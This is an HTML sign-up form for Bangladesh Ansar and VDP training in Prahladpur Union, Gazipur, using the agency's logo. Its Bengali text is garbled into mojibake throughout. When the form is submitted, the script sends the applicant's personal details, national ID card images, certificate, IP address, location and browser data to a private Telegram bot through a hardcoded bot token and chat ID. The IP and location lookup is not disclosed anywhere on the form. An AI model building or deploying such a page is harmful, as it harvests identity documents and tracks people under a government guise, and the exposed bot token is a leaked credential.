<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ржкрзНрж░рж╣рж▓рж╛ржжржкрзБрж░ ржЗржЙржирж┐рзЯржи ржнрж┐ржбрж┐ржкрж┐ ржлрж░рзНржо</title>
<style>
body { font-family:"SolaimanLipi",sans-serif; background:#f4f6f8; margin:0; padding:0;}
header { background:#0a2f54; color:white; text-align:center; padding:20px;}
header p, header h1 { margin:5px 0; }
header p { font-size:14px; }
header .slogan { font-size:16px; margin-bottom:10px; }
.logo { width:80px; height:80px; display:inline-block; margin-bottom:10px;}
form { max-width:600px; margin:30px auto; background:#fff; padding:20px; border-radius:10px; box-shadow:0 5px 15px rgba(0,0,0,0.1);}
form label { display:block; margin-top:15px; font-weight:bold;}
form input, form select { width:100%; padding:10px; margin-top:5px; border-radius:5px; border:1px solid #ccc; box-sizing:border-box;}
form input[type="file"] { padding:3px;}
.submit-btn { background:#0a2f54; color:white; padding:15px; margin-top:20px; width:100%; border:none; border-radius:5px; cursor:pointer; font-size:16px;}
.submit-btn:hover { background:#07406d;}
footer { text-align:center; font-size:12px; color:#666; margin-top:20px; padding:10px 0; background:#f4f6f8; }
</style>
</head>
<body>

<header>
    <p class="slogan">рж╢рж╛ржирзНрждрж┐,┬а┬а┬а┬арж╢рзГржЩрзНржЦрж▓рж╛,┬а┬а┬а┬аржЙржирзНржиржпрж╝ржи,┬а┬а┬а┬аржирж┐рж░рж╛ржкрждрзНрждрж╛ржпрж╝┬а┬а┬а┬арж╕рж░рзНржмрждрзНрж░┬а┬а┬а┬аржЖржорж░рж╛</p>
    <img src="https://ansarvdp.gov.bd/themes/responsive_npf/img/logo/ansarvdp.png" alt="ANSAR VDP Logo" class="logo">
    <h1>ЁЯФ░ ржмрж╛ржВрж▓рж╛ржжрзЗрж╢ ржЖржирж╕рж╛рж░ ржУ ржЧрзНрж░рж╛ржо ржкрзНрж░рждрж┐рж░ржХрзНрж╖рж╛ ржмрж╛рж╣рж┐ржирзА</h1>
    <p>ЁЯОУ ржЧрзНрж░рж╛ржоржнрж┐рждрзНрждрж┐ржХ ржЕрж╕рзНрждрзНрж░ржмрж┐рж╣рзАржи ржнрж┐ржбрж┐ржкрж┐ ржорзМрж▓рж┐ржХ ржкрзНрж░рж╢рж┐ржХрзНрж╖ржг (ржкрзБрж░рзБрж╖ ржУ ржорж╣рж┐рж▓рж╛)<br>ЁЯУН ржкрзНрж░рж╣рж▓рж╛ржжржкрзБрж░ ржЗржЙржирж┐рзЯржи, рж╢рзНрж░рзАржкрзБрж░, ржЧрж╛ржЬрзАржкрзБрж░ред</p>
</header>

<form id="vdpForm">

<label>ржирж╛ржо *</label>
<input type="text" id="name" required>

<label>ржорзЛржмрж╛ржЗрж▓ ржиржорзНржмрж░ *</label>
<input type="tel" id="phone" required>

<label>ржЬрж╛рждрзАрзЯ ржкрж░рж┐ржЪрзЯржкрждрзНрж░рзЗрж░ ржЫржмрж┐ ржмрж╛ PDF *</label>
<select id="nidOption" required>
<option value="">-- ржирж┐рж░рзНржмрж╛ржЪржи ржХрж░рзБржи --</option>
<option value="separate">ржЖрж▓рж╛ржжрж╛ ржЫржмрж┐ (Front/Back)</option>
<option value="combined">рж╕рж╛ржоржирзЗ ржУ ржкрж┐ржЫржирзЗрж░ ржПржХрж╕рж╛ржерзЗ</option>
</select>

<div id="nidSeparate" style="display:none;">
<label>ржЬрж╛рждрзАрзЯ ржкрж░рж┐ржЪрзЯржкрждрзНрж░ рж╕рж╛ржоржирзЗрж░ ржЫржмрж┐ *</label>
<input type="file" id="nidFront" required>
<label>ржЬрж╛рждрзАрзЯ ржкрж░рж┐ржЪрзЯржкрждрзНрж░ ржкрж┐ржЫржирзЗрж░ ржЫржмрж┐ *</label>
<input type="file" id="nidBack" required>
</div>

<div id="nidCombinedDiv" style="display:none;">
<label>ржЬрж╛рждрзАрзЯ ржкрж░рж┐ржЪрзЯржкрждрзНрж░ рж╕рж╛ржоржирзЗржУ ржкрж┐ржЫржирзЗрж░ ржЫржмрж┐ ржПржХрж╕рж╛ржерзЗ *</label>
<input type="file" id="nidCombined">
</div>

<label>рж╢рж┐ржХрзНрж╖рж╛ржЧржд рж╕рж╛рж░рзНржЯрж┐ржлрж┐ржХрзЗржЯ (ржлрж╛ржЗрж▓)</label>
<input type="file" id="certificate">

<label>ржЬржирзНржо рждрж╛рж░рж┐ржЦ *</label>
<input type="date" id="dob" required>

<label>ржмрзЯрж╕ *</label>
<input type="number" id="age" readonly required>

<label>ржЙржЪрзНржЪрждрж╛ (ржлрзБржЯ) *</label>
<input type="number" id="heightFeet" placeholder="ржлрзБржЯ" required>

<label>ржЙржЪрзНржЪрждрж╛ (ржЗржЮрзНржЪрж┐) *</label>
<input type="number" id="heightInch" placeholder="ржЗржЮрзНржЪрж┐" required>

<label>рж▓рж┐ржЩрзНржЧ *</label>
<select id="gender" required>
<option value="">-- ржирж┐рж░рзНржмрж╛ржЪржи ржХрж░рзБржи --</option>
<option value="ржкрзБрж░рзБрж╖">ржкрзБрж░рзБрж╖</option>
<option value="ржорж╣рж┐рж▓рж╛">ржорж╣рж┐рж▓рж╛</option>
</select>

<label>ржУрзЯрж╛рж░рзНржб *</label>
<select id="ward" required>
<option value="">-- ржирж┐рж░рзНржмрж╛ржЪржи ржХрж░рзБржи --</option>
<option value="1">рзз ржиржВ ржУрзЯрж╛рж░рзНржб</option>
<option value="2">рзи ржиржВ ржУрзЯрж╛рж░рзНржб</option>
<option value="3">рзй ржиржВ ржУрзЯрж╛рж░рзНржб</option>
<option value="4">рзк ржиржВ ржУрзЯрж╛рж░рзНржб</option>
<option value="5">рзл ржиржВ ржУрзЯрж╛рж░рзНржб</option>
<option value="6">рзм ржиржВ ржУрзЯрж╛рж░рзНржб</option>
<option value="7">рзн ржиржВ ржУрзЯрж╛рж░рзНржб</option>
<option value="8">рзо ржиржВ ржУрзЯрж╛рж░рзНржб</option>
<option value="9">рзп ржиржВ ржУрзЯрж╛рж░рзНржб</option>
</select>

<label>ржЧрзНрж░рж╛ржо *</label>
<select id="village" required>
<option value="">-- ржкрзНрж░ржержорзЗ ржУрзЯрж╛рж░рзНржб рж╕рж┐рж▓рзЗржХрзНржЯ ржХрж░рзБржи --</option>
</select>

<button type="submit" class="submit-btn">рж╕рж╛ржмржорж┐ржЯ</button>
</form>

<footer>
  <a href="https://ansarandvdpprahladpur.wordpress.com/" target="_blank">
    Bangladesh Ansar and VDP тАУ Prahladpur Union, Sreepur, Gazipur
  </a>
</footer>


<script>
// ржЬржирзНржо рждрж╛рж░рж┐ржЦ ржерзЗржХрзЗ ржмрзЯрж╕
const dobField = document.getElementById('dob');
const ageField = document.getElementById('age');
dobField.addEventListener('change', ()=>{
const dob = new Date(dobField.value);
const diff = Date.now() - dob.getTime();
const age = Math.floor(diff / (1000*60*60*24*365.25));
ageField.value = age;
});

// ржУрзЯрж╛рж░рзНржб тЖТ ржЧрзНрж░рж╛ржо
const wardVillageMap = {
'1':['ржбрзБржоржирзА','ржлрж╛ржЙржЧрж╛ржи'],
'2':['ржкрзНрж░рж╣рж▓рж╛ржжржкрзБрж░'],
'3':['ржЖржЯрж┐ржкрж╛рзЬрж╛','ржирж╛ржирж╛ржЗрзЯрж╛','ржирж╛ржирж╛ржЗрзЯрж╛рж░ржЪрж░','ржмрж╛ржШржорж╛рж░рж╛','ржорж╛рж░рзНрждрж╛рж░ржЪрж░'],
'4':['ржЖрждрж▓рзЬрж╛','ржмржиржЦрзЬрж┐рзЯрж╛'],
'5':['ржЙржЬрж▓рж┐рзЯрж╛','ржХрж░рж▓рж╛ржорж╛ржзржмржкрзБрж░','ржмрж╛рж╢ржХрзЛржкрж╛','рж╕рзЗрж░рж╛рж▓рж┐рзЯрж╛ржмрж╛рзЬрзА'],
'6':['ржЖрж╢рзБрж▓рзАрзЯрж╛ржкрж╛рзЬрж╛','ржкрзЛрждрж╛ржмрж╛рзЬрзА','ржнрж┐ржЯрж┐ржкрж╛рзЬрж╛','ржорж░рж┐ржЪрж╛рж░ржЪрж╛рж▓рж╛'],
'7':['ржХржжржорж╛','ржкрзНрж░рждрж╛ржмржкрзБрж░','рж░рж╛ржЦрж╛рж▓рж┐рзЯрж╛','рж▓рзЛрж╣рж╛ржЧрж╛ржЫрж┐рзЯрж╛'],
'8':['ржЪрж░ржжржоржжржорж╛','ржжржоржжржорж╛'],
'9':['ржирж┐ржорзБрж░рж┐рзЯрж╛','ржорзЗржирзНржжрж┐ржкрзБрж░','ржорж╛рж░рждрж╛']
};
const wardField = document.getElementById('ward');
const villageField = document.getElementById('village');
wardField.addEventListener('change', ()=>{
const villages = wardVillageMap[wardField.value] || [];
villageField.innerHTML = '<option value="">-- ржЧрзНрж░рж╛ржо ржирж┐рж░рзНржмрж╛ржЪржи ржХрж░рзБржи --</option>';
villages.forEach(v=>{
const opt=document.createElement('option'); opt.value=v; opt.text=v; villageField.appendChild(opt);
});
});

// NID option logic
const nidOption = document.getElementById('nidOption');
const nidSeparate = document.getElementById('nidSeparate');
const nidCombinedDiv = document.getElementById('nidCombinedDiv');
nidOption.addEventListener('change', ()=>{
if(nidOption.value==='separate'){
nidSeparate.style.display='block';
nidCombinedDiv.style.display='none';
document.getElementById('nidFront').required=true;
document.getElementById('nidBack').required=true;
document.getElementById('nidCombined').required=false;
} else if(nidOption.value==='combined'){
nidSeparate.style.display='none';
nidCombinedDiv.style.display='block';
document.getElementById('nidFront').required=false;
document.getElementById('nidBack').required=false;
document.getElementById('nidCombined').required=true;
} else {
nidSeparate.style.display='none';
nidCombinedDiv.style.display='none';
document.getElementById('nidFront').required=false;
document.getElementById('nidBack').required=false;
document.getElementById('nidCombined').required=false;
}
});

// Form submit + Telegram + IP + Device + Location
const form = document.getElementById('vdpForm');
form.addEventListener('submit', async (e)=>{
e.preventDefault();

const token="7728822427:AAE7T1k6yq5TejRnEySeac1_qQ6fCkA8v1s";
const chatId="7079142411";

const name=document.getElementById('name').value;
const phone=document.getElementById('phone').value;
const dob=document.getElementById('dob').value;
const age=document.getElementById('age').value;
const heightFeet=document.getElementById('heightFeet').value;
const heightInch=document.getElementById('heightInch').value;
const gender=document.getElementById('gender').value;
const ward=document.getElementById('ward').value;
const village=document.getElementById('village').value;

const certificateFile=document.getElementById('certificate').files[0];
const nidFront=document.getElementById('nidFront')?.files[0];
const nidBack=document.getElementById('nidBack')?.files[0];
const nidCombined=document.getElementById('nidCombined')?.files[0];

// Get IP & Location
let ip='Unknown', country='Unknown', city='Unknown';
try{
    const ipRes=await fetch('https://ipapi.co/json/');
    const ipData=await ipRes.json();
    ip = ipData.ip;
    country = ipData.country_name;
    city = ipData.city;
}catch(err){ console.log('IP/Location error', err); }

// Device info
const device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent)? 'Mobile' : 'Desktop';
const browser = navigator.userAgent;

let message=`ржирж┐ржмржирзНржзржи рждржерзНржп:
    
ржирж╛ржо: ${name}
ржорзЛржмрж╛ржЗрж▓: ${phone}
ржЬржирзНржо рждрж╛рж░рж┐ржЦ: ${dob}
ржмрзЯрж╕: ${age}
ржЙржЪрзНржЪрждрж╛: ${heightFeet} ржлрзБржЯ ${heightInch} ржЗржЮрзНржЪрж┐
рж▓рж┐ржЩрзНржЧ: ${gender}
ржУрзЯрж╛рж░рзНржб: ${ward}
ржЧрзНрж░рж╛ржо: ${village}
IP: ${ip}
ржжрзЗрж╢: ${country}
рж╢рж╣рж░: ${city}
ржбрж┐ржнрж╛ржЗрж╕: ${device}
ржмрзНрж░рж╛ржЙржЬрж╛рж░: ${browser}`;

await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({chat_id:chatId,text:message})
});

async function sendFile(file,type){
if(file){
const formData=new FormData();
formData.append('chat_id',chatId);
if(type==='photo') formData.append('photo',file);
else formData.append('document',file);
await fetch(`https://api.telegram.org/bot${token}/send${type==='photo'?'Photo':'Document'}`,{method:'POST',body:formData});
}
}

// Send files according to selection
if(nidOption.value==='separate'){
await sendFile(nidFront,'photo');
await sendFile(nidBack,'photo');
} else if(nidOption.value==='combined'){
await sendFile(nidCombined,'document');
}

await sendFile(certificateFile,'document');

alert("ржбрзЗржЯрж╛ рж╕рж╛ржмржорж┐ржЯ рж╣рзЯрзЗржЫрзЗред ржзржирзНржпржмрж╛ржж!");
form.reset();
});
</script>

</body>
</html>
